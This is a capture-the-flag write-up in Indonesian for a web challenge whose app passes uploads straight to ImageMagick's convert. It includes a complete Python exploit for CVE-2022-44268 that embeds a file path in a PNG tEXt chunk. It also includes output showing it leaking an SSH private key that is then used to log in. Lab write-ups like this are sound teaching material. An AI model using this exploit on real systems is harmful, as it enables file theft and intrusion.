# WriteUp - Quick Resize Web

## Overview
* **Nama:** Quick Resize Web
* **Kategori:** Server Side Attack / Cve
* **Poin:** 80
* **Deskripsi:** Si anak magang, Bahlil, bikin web app buat resize gambar. Karena malas baca dokumentasi, dia asal install library image processor versi lama dari StackOverflow. Katanya sih 'If it works, don't touch it'. Kasih paham ke Bahlil kalau metadata PNG zaman sekarang itu bisa diisi mantra ajaib. Bawa pulang kunci SSH miliknya dan jalankan `/get_flag`!
* **Author:** -
* **URL:** `http://localhost:1337` (SSH di port 2222)

## Reconnaissance

Konfigurasi awal Docker `quick-resize.yml` memiliki deklarasi `deploy` yang tidak didukung oleh beberapa kernel *host*, sehingga perlu dihapus agar *container* dapat berjalan.

Struktur direktori aplikasi dan *source code* pada `/app/app.py`:

```bash
▶  docker exec quickresizeweb-web-1 ls -la
total 20
drwxr-xr-x    1 root     root          4096 Apr 20 15:11 .
drwxr-xr-x    1 root     root          4096 Apr 20 15:11 ..
-rw-r--r--    1 root     root          1078 Apr 19 14:43 app.py
drwxr-xr-x    2 root     root          4096 Apr  8 06:04 templates
drwxr-xr-x    2 appuser  appuser       4096 Apr 19 14:43 uploads

▶  docker exec quickresizeweb-web-1 cat app.py
# ... [snip] ...
@app.route('/upload', methods=['POST'])
def upload():
    # ... [snip] ...
    in_name  = f'{uuid.uuid4()}_in.png'
    out_name = f'{uuid.uuid4()}.png'
    in_path  = os.path.join(UPLOAD_DIR, in_name)
    out_path = os.path.join(UPLOAD_DIR, out_name)
    f.save(in_path)
    os.system(f'convert -resize 200x200 {in_path} {out_path}')
    os.remove(in_path)
    return jsonify({'filename': out_name})
```

Aplikasi menggunakan perintah `convert` dari ImageMagick secara langsung (`os.system`) tanpa sanitasi lebih lanjut. Berdasarkan deskripsi tantangan yang menyebutkan "image processor versi lama" dan "metadata PNG", kerentanan yang teridentifikasi adalah **CVE-2022-44268** (ImageMagick Arbitrary File Read). 

Jika sebuah file PNG disisipi dengan *chunk text* (`tEXt`) yang menggunakan kata kunci `profile` dan nilai *path* file lokal (misal: `/etc/passwd`), ImageMagick akan membaca file tersebut, melakukan *hex-encoding*, dan menyematkannya ke dalam metadata file output PNG sebagai "Raw profile type".

## Step by Step Solution

### 1. Perbaikan Environment Docker Lokal
Sebelum melakukan eksploitasi, error pada saat menjalankan `docker compose up` harus diperbaiki dengan menghapus blok `deploy` (yang mengatur *cgroup limits*) dari file `quick-resize.yml` karena limitasi komparabilitas kernel lokal.

### 2. Eksploitasi ImageMagick (CVE-2022-44268)
Sebuah *script* Python dibuat untuk secara khusus membentuk file PNG dengan *chunk* `tEXt` berbahaya. *Payload* yang digunakan menargetkan pembacaan file dengan cara mengisi metadata *profile* dengan lokasi file absolut yang ingin dibaca dari dalam *container*.

### 3. Penyesuaian Ekstraksi Hex pada zTXt/tEXt Chunk
ImageMagick mengembalikan data file dalam format heksadesimal di dalam *chunk* `tEXt` atau `zTXt` yang dikompresi zlib. Ditemukan bahwa ImageMagick meletakkan panjang data (misal `745`) tepat sebelum blok heksadesimal. *Script solver* diperbarui agar memfilter baris yang hanya berisi angka panjang ini, kemudian menyatukan *string* heksadesimal yang tersisa, dan melakukan *unhexlify* untuk mendapatkan teks murni dari file target.

### 4. Ekstraksi Private Key SSH (id_rsa)
Setelah beberapa percobaan direktori (termasuk `/etc/passwd` untuk mengetahui *user* `appuser`), eksploitasi difokuskan pada direktori *default* SSH milik `appuser`. *Payload* diarahkan untuk membaca file `/home/appuser/.ssh/id_rsa`. File gambar yang dihasilkan oleh server diunduh, metadatanya diekstrak, dan *Private Key* RSA berhasil dibaca dengan sempurna.

### 5. Remote Access dan Eksekusi Flag
Kunci RSA yang diekstrak disimpan ke dalam file lokal `id_rsa` dengan *permission* ketat (`chmod 600`). Menggunakan kunci tersebut, otentikasi SSH dilakukan ke *container* target pada port `2222`. Setelah masuk sebagai `appuser`, file eksekusi `/get_flag` (yang memiliki *permission* eksekusi namun tidak dapat dibaca isinya secara langsung) dijalankan untuk mendekripsi dan mendapatkan flag.

## Script Solver

```python
import requests
import struct
import binascii
import zlib
import os
import sys

BASE_URL = "http://localhost:1337"

def create_payload(filepath, output="payload.png"):
    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">II", 1, 1) + b"\x08\x06\x00\x00\x00"
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr += struct.pack(">I", binascii.crc32(ihdr[4:]) & 0xFFFFFFFF)

    text_data = b"profile\x00" + filepath.encode()
    text_chunk = struct.pack(">I", len(text_data)) + b"tEXt" + text_data
    text_chunk += struct.pack(">I", binascii.crc32(text_chunk[4:]) & 0xFFFFFFFF)

    idat_data = b"\x08\x1d\x01\x05\x00\xfa\xff\x00\x00\x00\x00\x00\x00\x05\x00\x01"
    idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data
    idat += struct.pack(">I", binascii.crc32(idat[4:]) & 0xFFFFFFFF)

    iend = struct.pack(">I", 0) + b"IEND"
    iend += struct.pack(">I", binascii.crc32(iend[4:]) & 0xFFFFFFFF)

    with open(output, "wb") as f:
        f.write(png_sig + ihdr + text_chunk + idat + iend)
    return output

def extract_file(image_content):
    idx = 8
    while idx < len(image_content):
        length = struct.unpack(">I", image_content[idx:idx+4])[0]
        chunk_type = image_content[idx+4:idx+8]
        chunk_data = image_content[idx+8:idx+8+length]
        idx += 12 + length

        text_content = ""
        key = ""
        
        if chunk_type == b"zTXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                compressed = chunk_data[null_idx+2:]
                try:
                    text_content = zlib.decompress(compressed).decode('utf-8', errors='ignore')
                except Exception:
                    continue
        elif chunk_type == b"tEXt":
            null_idx = chunk_data.find(b"\x00")
            if null_idx != -1:
                key = chunk_data[:null_idx].decode('utf-8', errors='ignore')
                text_content = chunk_data[null_idx+1:].decode('utf-8', errors='ignore')

        if key == "Raw profile type":
            hex_lines = []
            for line in text_content.split("\n"):
                clean = line.strip()
                if clean and len(clean) > 8 and all(c in "0123456789abcdefABCDEF" for c in clean):
                    hex_lines.append(clean)
            
            if hex_lines:
                hex_data = "".join(hex_lines)
                try:
                    return binascii.unhexlify(hex_data).decode('utf-8', errors='ignore')
                except Exception as e:
                    print(f"[-] Hex decode error: {e}")
    return None

def exploit(target_file):
    print(f"[*] Generating malicious PNG to read: {target_file}")
    payload_file = create_payload(target_file)
    
    print(f"[*] Uploading payload to {BASE_URL}/upload...")
    with open(payload_file, "rb") as f:
        files = {'image': ('payload.png', f, 'image/png')}
        res = requests.post(f"{BASE_URL}/upload", files=files)
        
    if res.status_code != 200:
        print(f"[-] Upload failed: {res.text}")
        return
        
    out_filename = res.json().get('filename')
    print(f"[+] Upload success. Resized image: {out_filename}")
    
    print(f"[*] Downloading resized image...")
    res_img = requests.get(f"{BASE_URL}/uploads/{out_filename}")
    
    print(f"[*] Extracting leaked data from image chunks...")
    leaked_data = extract_file(res_img.content)
    
    if leaked_data:
        print("\n" + "="*50)
        print(f"[+] EXTRACTED CONTENT OF {target_file}:\n")
        print(leaked_data.strip())
        print("\n" + "="*50 + "\n")
    else:
        print("[-] No leaked data found.")

    os.remove(payload_file)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solver.py <file_to_read>")
        sys.exit(1)
    exploit(sys.argv[1])
```

## Output Terminal Solver

```bash
▶  ./dummper.py /home/appuser/.ssh/id_rsa
[*] Generating malicious PNG to read: /home/appuser/.ssh/id_rsa
[*] Uploading payload to http://localhost:1337/upload...
[+] Upload success. Resized image: 72cf0165-f4aa-45c1-ae1c-d8bba679a2ae.png
[*] Downloading resized image...
[*] Extracting leaked data from image chunks...

==================================================
[+] EXTRACTED CONTENT OF /home/appuser/.ssh/id_rsa:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA4+MLB3Uzh7OrgtKq6gCfn986o/PbP0Azns9Ye98RfrXdyE973qQk
Y4GRzAUIXZSAK2Iw8Dil/Giv0Ed9seOumkr6Da6MZ7MAbrrGG7czN3O0Z/FNq9LAZBVhRX
... [snip] ...
MiXY1ThQCO4LOknTAAAAEXJvb3RANDhjMmJmZGFhZDkxAQ==
-----END OPENSSH PRIVATE KEY-----

==================================================

▶  chmod 600 id_rsa

▶  ssh -i id_rsa -p 2222 appuser@localhost
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:HK0XLlO1e9TFQN+pEF9mzIybN6QFnK45LkV6d9YUzF0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
Welcome to Alpine!
...

48c2bfdaad91:~$ /get_flag
[*] Decrypting flag...
pwn{50596365d34a90a244a422b4b802a804}
```

## Flag
`pwn{50596365d34a90a244a422b4b802a804}`
